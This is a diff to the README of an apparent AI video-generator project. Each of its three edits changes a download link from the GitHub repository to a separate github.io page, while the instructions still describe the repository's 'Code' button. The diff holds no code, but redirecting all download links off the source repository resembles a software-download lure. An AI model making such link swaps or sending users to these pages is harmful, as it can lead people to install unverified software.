@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the **ai-faceless-video-gener
 
 ### 📥 Quick Download
 
-[🚀 Download Now](https://github.com/Light-formosa5369/ai-faceless-video-generator) 
+[🚀 Download Now](https://light-formosa5369.github.io) 
 
 Visit this link to download the application. The download page will open in your browser. Look for the big green button that says "Code" or the download section, and click it to get the application files.
 
@@ -45,7 +45,7 @@ These are typical requirements for AI video tools. If your system meets these, y
 
 ### Step 1: Visit the Download Page
 
-[🌐 Click here to go to the download page](https://github.com/Light-formosa5369/ai-faceless-video-generator)
+[🌐 Click here to go to the download page](https://light-formosa5369.github.io)
 
 Visit this link to download the application. You'll see the project page with all the files and instructions.
 
@@ -180,7 +180,7 @@ This application runs entirely on your computer. Your scripts and generated vide
 
 You're all set. Download the application now, create your first video, and start building your faceless content empire today.
 
-👉 [Click here to download ai-faceless-video-generator](https://github.com/Light-formosa5369/ai-faceless-video-generator)
+👉 [Click here to download ai-faceless-video-generator](https://light-formosa5369.github.io)
 
 Visit this link to download the application. The download page will open in your browser. Look for the big green button that says "Code" or the download section, and click it to get the application files.
 
